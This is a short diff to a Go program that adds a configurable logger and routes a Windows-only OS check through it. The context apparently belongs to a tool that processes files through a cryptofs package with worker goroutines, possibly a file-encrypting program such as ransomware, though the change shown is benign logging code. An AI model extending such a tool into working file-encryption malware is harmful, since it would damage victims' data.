@@ -65,6 +65,19 @@ var (
 		Files: make(chan *cryptofs.File),
 	}
 
+	// The logger instance
+	Logger = func() *log.Logger {
+		// The default destination is os.Stderr, but you can set any io.Writer
+		// as the log output. Use ioutil.Discard to ignore the log output
+		//
+		// Example with a file:
+		// f, err := os.OpenFile(TempDir+"example.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
+		// handle error...
+		// return log.New(f, "optional prefix", log.LstdFlags)
+		//
+		return log.New(os.Stderr, "", log.LstdFlags)
+	}()
+
 	// Workers processing the files
 	NumWorkers = 2
 
@@ -84,6 +97,6 @@ var (
 // Execute only on windows
 func CheckOS() {
 	if runtime.GOOS != "windows" {
-		log.Fatalln("Sorry, but your OS is currently not supported. Try again with a windows machine")
+		Logger.Fatalln("Sorry, but your OS is currently not supported. Try again with a windows machine")
 	}
 }
